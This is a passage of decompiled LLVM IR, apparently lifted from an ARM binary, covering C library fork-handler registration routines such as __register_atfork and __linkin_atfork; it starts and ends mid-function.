  br label %dec_label_pc_190b4

dec_label_pc_190b4:                               ; preds = %dec_label_pc_19084, %dec_label_pc_1909c.dec_label_pc_19090_crit_edge, %dec_label_pc_190b0
  %v0_190b4 = phi i32 [ %v0_190b0, %dec_label_pc_190b0 ], [ %v2_1909018, %dec_label_pc_19084 ], [ %v2_19090, %dec_label_pc_1909c.dec_label_pc_19090_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_190b4 = icmp eq i32 %v0_190b4, 0
  %v0_190d8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_190b4, label %dec_label_pc_190d4, label %dec_label_pc_190bc

dec_label_pc_190bc:                               ; preds = %dec_label_pc_190b4
  store i32 %v0_190d8.pre, i32* %r0.global-to-local, align 4
  %v0_190c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_190c0 = add i32 %v0_190c0, 126
  store i32 %v1_190c0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_190d4

dec_label_pc_190d4:                               ; preds = %dec_label_pc_190b4, %dec_label_pc_190bc
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_190d8.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_190e028 = inttoptr i32 %v0_190d8.pre to i32*
  %v2_190e029 = load i32, i32* %v1_190e028, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_190e436 = icmp eq i32 %v2_190e029, 0
  br i1 %v9_190e436, label %dec_label_pc_190ec, label %dec_label_pc_19104

dec_label_pc_190ec:                               ; preds = %dec_label_pc_190d4, %dec_label_pc_190ec.dec_label_pc_190e0_crit_edge
  %v0_190ec37 = phi i32 [ %v1_190e4.pre, %dec_label_pc_190ec.dec_label_pc_190e0_crit_edge ], [ 0, %dec_label_pc_190d4 ]
  store i32 %v0_190ec37, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_190fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_190fc, label %dec_label_pc_19100, label %dec_label_pc_190ec.dec_label_pc_190e0_crit_edge

dec_label_pc_190ec.dec_label_pc_190e0_crit_edge:  ; preds = %dec_label_pc_190ec
  %v0_190e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_190e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_190e0 = inttoptr i32 %v0_190e0.pre to i32*
  %v2_190e0 = load i32, i32* %v1_190e0, align 4
  %v3_190e4 = icmp uge i32 %v2_190e0, %v1_190e4.pre
  store i1 %v3_190e4, i1* %cpsr_c.global-to-local, align 1
  %v9_190e4 = icmp eq i32 %v2_190e0, %v1_190e4.pre
  br i1 %v9_190e4, label %dec_label_pc_190ec, label %dec_label_pc_19104

dec_label_pc_19100:                               ; preds = %dec_label_pc_190ec
  %v0_19100 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19104

dec_label_pc_19104:                               ; preds = %dec_label_pc_190d4, %dec_label_pc_190ec.dec_label_pc_190e0_crit_edge, %dec_label_pc_19100
  %v0_19104 = phi i32 [ %v0_19100, %dec_label_pc_19100 ], [ %v2_190e029, %dec_label_pc_190d4 ], [ %v2_190e0, %dec_label_pc_190ec.dec_label_pc_190e0_crit_edge ]
  %v1_19104 = phi i32 [ %v0_19100, %dec_label_pc_19100 ], [ 0, %dec_label_pc_190d4 ], [ %v1_190e4.pre, %dec_label_pc_190ec.dec_label_pc_190e0_crit_edge ]
  %v3_19104 = icmp uge i32 %v0_19104, %v1_19104
  store i1 %v3_19104, i1* %cpsr_c.global-to-local, align 1
  %v9_19104 = icmp eq i32 %v0_19104, %v1_19104
  br i1 %v9_19104, label %dec_label_pc_1910c, label %dec_label_pc_19104.dec_label_pc_19084_crit_edge

dec_label_pc_19104.dec_label_pc_19084_crit_edge:  ; preds = %dec_label_pc_19104
  %v0_19088.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19084

dec_label_pc_1910c:                               ; preds = %dec_label_pc_19104
  %v2_1910c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1910c, i32* %r4.global-to-local, align 4
  %v1_19110 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_19110

; uselistorder directives
  uselistorder i32 %v0_19100, { 1, 0 }
  uselistorder i32 %v1_190e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_19094.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1909018, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 1, 0 }
  uselistorder label %dec_label_pc_19104, { 2, 1, 0 }
  uselistorder label %dec_label_pc_190ec, { 1, 0 }
  uselistorder label %dec_label_pc_190d4, { 1, 0 }
  uselistorder label %dec_label_pc_190b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1909c, { 1, 0 }
}

define i32 @__linkin_atfork(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_19114 = load i32, i32* @r4, align 4
  store i32 %v3_19114, i32* %stack_var_-24, align 4
  store i32 30120, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r5.global-to-local, align 4
  %v0_19124 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19124, i32* %r6.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30120), i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1912c

dec_label_pc_1912c:                               ; preds = %dec_label_pc_19160.dec_label_pc_1912c_crit_edge, %entry
  %v0_19130 = phi i32 [ %v0_19130.pre, %dec_label_pc_19160.dec_label_pc_1912c_crit_edge ], [ %v0_19124, %entry ]
  %v1_1912c = phi i32 [ %v1_1912c.pre, %dec_label_pc_19160.dec_label_pc_1912c_crit_edge ], [ 30120, %entry ]
  %v0_1912c = phi i32 [ %v0_1912c.pre, %dec_label_pc_19160.dec_label_pc_1912c_crit_edge ], [ ptrtoint (i32* @global_var_32024.1324 to i32), %entry ]
  %v2_1912c = add i32 %v0_1912c, %v1_1912c
  %v3_1912c = inttoptr i32 %v2_1912c to i32*
  %v4_1912c = load i32, i32* %v3_1912c, align 4
  store i32 %v4_1912c, i32* %r4.global-to-local, align 4
  %v2_19134 = inttoptr i32 %v0_19130 to i32*
  store i32 %v4_1912c, i32* %v2_19134, align 4
  %v0_19138 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_19138, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1913c

dec_label_pc_1913c:                               ; preds = %dec_label_pc_19148.dec_label_pc_1913c_crit_edge, %dec_label_pc_1912c
  %v0_1913c = phi i32 [ %v0_1913c.pre, %dec_label_pc_19148.dec_label_pc_1913c_crit_edge ], [ %v0_19138, %dec_label_pc_1912c ]
  %v1_1913c = inttoptr i32 %v0_1913c to i32*
  %v2_1913c = load i32, i32* %v1_1913c, align 4
  %v1_19140 = load i32, i32* %r4.global-to-local, align 4
  %v3_19140 = icmp uge i32 %v2_1913c, %v1_19140
  store i1 %v3_19140, i1* %cpsr_c.global-to-local, align 1
  %v9_19140 = icmp eq i32 %v2_1913c, %v1_19140
  br i1 %v9_19140, label %dec_label_pc_19148, label %dec_label_pc_19160

dec_label_pc_19148:                               ; preds = %dec_label_pc_1913c
  store i32 %v2_1913c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_19158 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_19158, label %dec_label_pc_1915c, label %dec_label_pc_19148.dec_label_pc_1913c_crit_edge

dec_label_pc_19148.dec_label_pc_1913c_crit_edge:  ; preds = %dec_label_pc_19148
  %v0_1913c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1913c

dec_label_pc_1915c:                               ; preds = %dec_label_pc_19148
  %v0_1915c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19160

dec_label_pc_19160:                               ; preds = %dec_label_pc_1913c, %dec_label_pc_1915c
  %v0_19160 = phi i32 [ %v0_1915c, %dec_label_pc_1915c ], [ %v2_1913c, %dec_label_pc_1913c ]
  %v1_19160 = phi i32 [ %v0_1915c, %dec_label_pc_1915c ], [ %v1_19140, %dec_label_pc_1913c ]
  %v3_19160 = icmp uge i32 %v0_19160, %v1_19160
  store i1 %v3_19160, i1* %cpsr_c.global-to-local, align 1
  %v9_19160 = icmp eq i32 %v0_19160, %v1_19160
  br i1 %v9_19160, label %dec_label_pc_19168, label %dec_label_pc_19160.dec_label_pc_1912c_crit_edge

dec_label_pc_19160.dec_label_pc_1912c_crit_edge:  ; preds = %dec_label_pc_19160
  %v0_1912c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1912c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_19130.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1912c

dec_label_pc_19168:                               ; preds = %dec_label_pc_19160
  %v2_19168 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_19168, i32* %r4.global-to-local, align 4
  %v1_1916c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1916c

; uselistorder directives
  uselistorder i32 %v0_1915c, { 1, 0 }
  uselistorder i32 %v1_19140, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30120), { 1, 0 }
  uselistorder i32 30120, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_19160, { 1, 0 }
}

define i32 @__GI___register_atfork(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_19178 = load i32, i32* @r4, align 4
  %v12_19178 = load i32, i32* @r7, align 4
  %v15_19178 = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 26328), i32* @r5, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @fp, align 4
  %v0_19198 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19198, i32* @r8, align 4
  store i32 %arg4, i32* @sl, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 26328), i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v2_191ac72 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 26328) to i32*), align 4
  store i32 %v2_191ac72, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_191b074 = icmp eq i32 %v2_191ac72, 0
  br i1 %v9_191b074, label %dec_label_pc_191b8, label %dec_label_pc_191d0

dec_label_pc_191b8:                               ; preds = %entry, %dec_label_pc_191b8.dec_label_pc_191ac_crit_edge
  %v0_191b875 = phi i32 [ %v1_191b0.pre, %dec_label_pc_191b8.dec_label_pc_191ac_crit_edge ], [ 0, %entry ]
  store i32 %v0_191b875, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_191c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_191c8, label %dec_label_pc_191cc, label %dec_label_pc_191b8.dec_label_pc_191ac_crit_edge

dec_label_pc_191b8.dec_label_pc_191ac_crit_edge:  ; preds = %dec_label_pc_191b8
  %v0_191ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_191b0.pre = load i32, i32* @r4, align 4
  %v1_191ac = inttoptr i32 %v0_191ac.pre to i32*
  %v2_191ac = load i32, i32* %v1_191ac, align 4
  store i32 %v2_191ac, i32* %r3.global-to-local, align 4
  %v3_191b0 = icmp uge i32 %v2_191ac, %v1_191b0.pre
  store i1 %v3_191b0, i1* %cpsr_c.global-to-local, align 1
  %v9_191b0 = icmp eq i32 %v2_191ac, %v1_191b0.pre
  br i1 %v9_191b0, label %dec_label_pc_191b8, label %dec_label_pc_191d0

dec_label_pc_191cc:                               ; preds = %dec_label_pc_191b8
  %v0_191cc = load i32, i32* @r4, align 4
  store i32 %v0_191cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_191d0

dec_label_pc_191d0:                               ; preds = %entry, %dec_label_pc_191b8.dec_label_pc_191ac_crit_edge, %dec_label_pc_191cc
  %v0_191d0 = phi i32 [ %v0_191cc, %dec_label_pc_191cc ], [ %v2_191ac72, %entry ], [ %v2_191ac, %dec_label_pc_191b8.dec_label_pc_191ac_crit_edge ]
  %v1_191d0 = phi i32 [ %v0_191cc, %dec_label_pc_191cc ], [ 0, %entry ], [ %v1_191b0.pre, %dec_label_pc_191b8.dec_label_pc_191ac_crit_edge ]
  %v3_191d0 = icmp uge i32 %v0_191d0, %v1_191d0
  store i1 %v3_191d0, i1* %cpsr_c.global-to-local, align 1
  %v9_191d0 = icmp eq i32 %v0_191d0, %v1_191d0
  br i1 %v9_191d0, label %bb48, label %bb

bb:                                               ; preds = %dec_label_pc_191d0
  %v1_191d4 = load i32, i32* @r5, align 4
  store i32 %v1_191d4, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_191d0, %bb
  store i32 102876, i32* @lr, align 4
  %v1_191d8 = xor i1 %v9_191d0, true
  call void @__pseudo_cond_branch(i1 %v1_191d8, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  store i32 26332, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r1.global-to-local, align 4
  %v0_191e4 = load i32, i32* @r6, align 4
  %v2_191e4 = add i32 %v0_191e4, 26332
  %v0_191e8.pre = load i32, i32* @r4, align 4
  %tmp49 = icmp ult i32 %v0_191e8.pre, 48
  br label %dec_label_pc_191e8

dec_label_pc_191e8:                               ; preds = %dec_label_pc_1920c, %bb48
  %v0_1920c = phi i32 [ %v2_1920c, %dec_label_pc_1920c ], [ %v2_191e4, %bb48 ]
  store i32 %v0_191e8.pre, i32* %r2.global-to-local, align 4
  br i1 %tmp49, label %dec_label_pc_191f0, label %dec_label_pc_1920c

dec_label_pc_191f0:                               ; preds = %dec_label_pc_191e8, %dec_label_pc_19200
  %v0_19200 = phi i32 [ %v1_19200, %dec_label_pc_19200 ], [ %v0_191e8.pre, %dec_label_pc_191e8 ]
  %v3_191f0 = mul i32 %v0_19200, 28
  %v4_191f0 = add i32 %v3_191f0, %v0_1920c
  store i32 %v4_191f0, i32* %r3.global-to-local, align 4
  %v1_191f4 = add i32 %v4_191f0, 24
  %v2_191f4 = inttoptr i32 %v1_191f4 to i32*
  %v3_191f4 = load i32, i32* %v2_191f4, align 4
  store i32 %v3_191f4, i32* %r3.global-to-local, align 4
  %v2_191f8 = icmp eq i32 %v3_191f4, 0
  br i1 %v2_191f8, label %dec_label_pc_19248.loopexit, label %dec_label_pc_19200

dec_label_pc_19200:                               ; preds = %dec_label_pc_191f0
  %v1_19200 = add nuw nsw i32 %v0_19200, 1
  store i32 %v1_19200, i32* %r2.global-to-local, align 4
  %tmp50 = icmp ult i32 %v1_19200, 48
  br i1 %tmp50, label %dec_label_pc_191f0, label %dec_label_pc_1920c

dec_label_pc_1920c:                               ; preds = %dec_label_pc_19200, %dec_label_pc_191e8
  %v1_1920c = inttoptr i32 %v0_1920c to i32*
  %v2_1920c = load i32, i32* %v1_1920c, align 4
  store i32 %v2_1920c, i32* @r7, align 4
  %v2_19210 = icmp eq i32 %v2_1920c, 0
  br i1 %v2_19210, label %dec_label_pc_19218, label %dec_label_pc_191e8

dec_label_pc_19218:                               ; preds = %dec_label_pc_1920c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1348, i32* %r1.global-to-local, align 4
  %v2_19220 = call i32 @calloc(i32 1, i32 1348)
  store i32 %v2_19220, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19224 = icmp eq i32 %v2_19220, 0
  br i1 %v2_19224, label %bb51, label %dec_label_pc_19230

bb51:                                             ; preds = %dec_label_pc_19218
  %v1_19228 = load i32, i32* @r7, align 4
  store i32 %v1_19228, i32* @r5, align 4
  br label %dec_label_pc_19278

dec_label_pc_19230:                               ; preds = %dec_label_pc_19218
  store i32 26332, i32* %r2.global-to-local, align 4
  %v0_19234 = load i32, i32* @r6, align 4
  %v2_19234 = add i32 %v0_19234, 26332
  %v3_19234 = inttoptr i32 %v2_19234 to i32*
  %v4_19234 = load i32, i32* %v3_19234, align 4
  store i32 %v4_19234, i32* %r3.global-to-local, align 4
  store i32 %v2_19220, i32* @r7, align 4
  %v2_1923c = inttoptr i32 %v2_19220 to i32*
  store i32 %v4_19234, i32* %v2_1923c, align 4
  %v0_19240 = load i32, i32* %r0.global-to-local, align 4
  %v1_19240 = load i32, i32* @r6, align 4
  %v2_19240 = load i32, i32* %r2.global-to-local, align 4
  %v3_19240 = add i32 %v2_19240, %v1_19240
  %v4_19240 = inttoptr i32 %v3_19240 to i32*
  store i32 %v0_19240, i32* %v4_19240, align 4
  store i32 47, i32* %r2.global-to-local, align 4
  %v2_1924c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19248

dec_label_pc_19248.loopexit:                      ; preds = %dec_label_pc_191f0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_19248

dec_label_pc_19248:                               ; preds = %dec_label_pc_19248.loopexit, %dec_label_pc_19230
  %v2_1924c = phi i32 [ %v0_1920c, %dec_label_pc_19248.loopexit ], [ %v2_1924c.pre, %dec_label_pc_19230 ]
  %v0_1924c = phi i32 [ %v0_19200, %dec_label_pc_19248.loopexit ], [ 47, %dec_label_pc_19230 ]
  %v3_1924c = mul i32 %v0_1924c, 28
  %v4_1924c = add i32 %v3_1924c, %v2_1924c
  store i32 %v4_1924c, i32* %r3.global-to-local, align 4
  %v2_19254 = add i32 %v4_1924c, 24
  %v3_19254 = inttoptr i32 %v2_19254 to i32*
  store i32 1, i32* %v3_19254, align 4
  %v0_19258 = load i32, i32* %r3.global-to-local, align 4
  %v1_19258 = add i32 %v0_19258, 4
  store i32 %v1_19258, i32* @r5, align 4
  %v2_19258 = icmp ugt i32 %v0_19258, -5
  store i1 %v2_19258, i1* %cpsr_c.global-to-local, align 1
  %v7_19258 = icmp eq i32 %v1_19258, 0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_19260 = add i32 %v0_19258, 28
  %v3_19260 = inttoptr i32 %v2_19260 to i32*
  store i32 0, i32* %v3_19260, align 4
  br i1 %v7_19258, label %dec_label_pc_19278, label %dec_label_pc_19268

dec_label_pc_19268:                               ; preds = %dec_label_pc_19248
  %v0_19268 = load i32, i32* @r5, align 4
  %v1_19268 = add i32 %v0_19268, 4
  %v2_19268 = inttoptr i32 %v1_19268 to i32*
  %v3_19268 = load i32, i32* @r8, align 4
  store i32 %v3_19268, i32* %v2_19268, align 4
  %v4_19268 = add i32 %v0_19268, 8
  %v5_19268 = inttoptr i32 %v4_19268 to i32*
  %v6_19268 = load i32, i32* @sb, align 4
  store i32 %v6_19268, i32* %v5_19268, align 4
  %v7_19268 = add i32 %v0_19268, 12
  %v8_19268 = inttoptr i32 %v7_19268 to i32*
  %v9_19268 = load i32, i32* @fp, align 4
  store i32 %v9_19268, i32* %v8_19268, align 4
  %v0_1926c = load i32, i32* @sl, align 4
  %v1_1926c = load i32, i32* @r5, align 4
  %v2_1926c = add i32 %v1_1926c, 16
  %v3_1926c = inttoptr i32 %v2_1926c to i32*
  store i32 %v0_1926c, i32* %v3_1926c, align 4
  %v0_19270 = load i32, i32* @r5, align 4
  store i32 %v0_19270, i32* %r0.global-to-local, align 4
  %v1_19274 = inttoptr i32 %v0_19270 to i32*
  %v2_19274 = call i32 @__linkin_atfork(i32* %v1_19274)
  store i32 %v2_19274, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19278

dec_label_pc_19278:                               ; preds = %bb51, %dec_label_pc_19248, %dec_label_pc_19268
  store i32 26328, i32* %r7.global-to-local, align 4
  %v0_1927c = load i32, i32* @r6, align 4
  %v2_1927c = add i32 %v0_1927c, 26328
  store i32 %v2_1927c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19280

dec_label_pc_19280:                               ; preds = %dec_label_pc_192b0.dec_label_pc_19280_crit_edge, %dec_label_pc_19278
  %v0_19288 = phi i32 [ %v0_19288.pre, %dec_label_pc_192b0.dec_label_pc_19280_crit_edge ], [ %v2_1927c, %dec_label_pc_19278 ]
  %v1_19280 = phi i32 [ %v1_19280.pre, %dec_label_pc_192b0.dec_label_pc_19280_crit_edge ], [ 26328, %dec_label_pc_19278 ]
  %v0_19280 = phi i32 [ %v0_19280.pre, %dec_label_pc_192b0.dec_label_pc_19280_crit_edge ], [ %v0_1927c, %dec_label_pc_19278 ]
  %v2_19280 = add i32 %v0_19280, %v1_19280
  %v3_19280 = inttoptr i32 %v2_19280 to i32*
  %v4_19280 = load i32, i32* %v3_19280, align 4
  store i32 %v4_19280, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_19288, i32* %r2.global-to-local, align 4
  %v1_1928c60 = inttoptr i32 %v0_19288 to i32*
  %v2_1928c61 = load i32, i32* %v1_1928c60, align 4
  store i32 %v2_1928c61, i32* %r3.global-to-local, align 4
  %v3_1929063 = icmp uge i32 %v2_1928c61, %v4_19280
  store i1 %v3_1929063, i1* %cpsr_c.global-to-local, align 1
  %v9_1929069 = icmp eq i32 %v2_1928c61, %v4_19280
  br i1 %v9_1929069, label %dec_label_pc_19298, label %dec_label_pc_192b0

dec_label_pc_19298:                               ; preds = %dec_label_pc_19280, %dec_label_pc_19298.dec_label_pc_1928c_crit_edge
  %v0_1929870 = phi i32 [ %v1_19290.pre, %dec_label_pc_19298.dec_label_pc_1928c_crit_edge ], [ %v4_19280, %dec_label_pc_19280 ]
  store i32 %v0_1929870, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_192a8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_192a8, label %dec_label_pc_192ac, label %dec_label_pc_19298.dec_label_pc_1928c_crit_edge

dec_label_pc_19298.dec_label_pc_1928c_crit_edge:  ; preds = %dec_label_pc_19298
  %v0_1928c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_19290.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1928c = inttoptr i32 %v0_1928c.pre to i32*
  %v2_1928c = load i32, i32* %v1_1928c, align 4
  store i32 %v2_1928c, i32* %r3.global-to-local, align 4
  %v3_19290 = icmp uge i32 %v2_1928c, %v1_19290.pre
  store i1 %v3_19290, i1* %cpsr_c.global-to-local, align 1
  %v9_19290 = icmp eq i32 %v2_1928c, %v1_19290.pre
  br i1 %v9_19290, label %dec_label_pc_19298, label %dec_label_pc_192b0

dec_label_pc_192ac:                               ; preds = %dec_label_pc_19298
  %v0_192ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_192ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_192b0

dec_label_pc_192b0:                               ; preds = %dec_label_pc_19280, %dec_label_pc_19298.dec_label_pc_1928c_crit_edge, %dec_label_pc_192ac
  %v0_192b8 = phi i32 [ %v0_192ac, %dec_label_pc_192ac ], [ %v2_1928c61, %dec_label_pc_19280 ], [ %v2_1928c, %dec_label_pc_19298.dec_label_pc_1928c_crit_edge ]
  %v1_192b0 = phi i32 [ %v0_192ac, %dec_label_pc_192ac ], [ %v4_19280, %dec_label_pc_19280 ], [ %v1_19290.pre, %dec_label_pc_19298.dec_label_pc_1928c_crit_edge ]
  %v3_192b0 = icmp uge i32 %v0_192b8, %v1_192b0
  store i1 %v3_192b0, i1* %cpsr_c.global-to-local, align 1
  %v9_192b0 = icmp eq i32 %v0_192b8, %v1_192b0
  br i1 %v9_192b0, label %dec_label_pc_192b8, label %dec_label_pc_192b0.dec_label_pc_19280_crit_edge

dec_label_pc_192b0.dec_label_pc_19280_crit_edge:  ; preds = %dec_label_pc_192b0
  %v0_19280.pre = load i32, i32* @r6, align 4
  %v1_19280.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_19288.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19280

dec_label_pc_192b8:                               ; preds = %dec_label_pc_192b0
  %v2_192b8 = icmp ne i32 %v1_192b0, 0
  store i1 %v2_192b8, i1* %cpsr_c.global-to-local, align 1
  %v7_192bc = icmp slt i32 %v1_192b0, 2
  br i1 %v7_192bc, label %dec_label_pc_192d8, label %dec_label_pc_192c0

dec_label_pc_192c0:                               ; preds = %dec_label_pc_192b8
  %v0_192c0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_192c0, i32* %r0.global-to-local, align 4
  %v0_192c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_192c4 = add i32 %v0_192c4, 129
  store i32 %v1_192c4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_192d8

dec_label_pc_192d8:                               ; preds = %dec_label_pc_192c0, %dec_label_pc_192b8
  %v0_192d8 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_192d8 = icmp eq i32 %v0_192d8, 0
  %. = select i1 %v2_192d8, i32 12, i32 0
  store i32 %., i32* %r0.global-to-local, align 4
  store i32 %v3_19178, i32* %r4.global-to-local, align 4
  store i32 %v12_19178, i32* %r7.global-to-local, align 4
  store i32 %v15_19178, i32* %r8.global-to-local, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v0_192ac, { 1, 0, 2 }
  uselistorder i32 %v1_19290.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_19220, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1920c, { 1, 2, 0 }
  uselistorder i32 %v1_19200, { 1, 2, 0 }
  uselistorder i32 %v0_19200, { 0, 2, 1 }
  uselistorder i32 %v0_1920c, { 0, 2, 1 }
  uselistorder i32 %v0_191e8.pre, { 0, 2, 1 }
  uselistorder i32 %v0_191cc, { 1, 0, 2 }
  uselistorder i32 %v1_191b0.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 14, 5, 6, 7, 8, 9, 10, 11, 13, 12, 15, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 2, 3, 5, 4, 9, 10, 6, 7, 8, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 10, 11, 4, 8, 5, 9, 6, 7, 12, 13 }
  uselistorder i32 26332, { 0, 2, 1, 3 }
  uselistorder i32 26328, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_192b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19298, { 1, 0 }
  uselistorder label %dec_label_pc_19278, { 2, 1, 0 }
  uselistorder label %dec_label_pc_191f0, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_191d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_191b8, { 1, 0 }
}

define i32 @function_192f4(i64* %arg1) local_unnamed_addr {
dec_label_pc_192f4:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_192f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_192f4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_192f4
  %v4_192f4 = load i32, i32* @r8, align 4
  %v9_192f4 = sub i32 %tmp, %v4_192f4
  %v4_192f8 = load i32, i32* @ip, align 4
  %v9_192f8 = sub i32 %v9_192f4, %v4_192f8
  %v2_192fc = load i32, i32* @r4, align 4
  %v5_192fc = sdiv i32 %v2_192fc, 1024
  %v6_192fc = and i32 %v5_192fc, %v9_192f8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_192f4, %bb
  %v7_192fc = phi i32 [ %tmp, %dec_label_pc_192f4 ], [ %v6_192fc, %bb ]
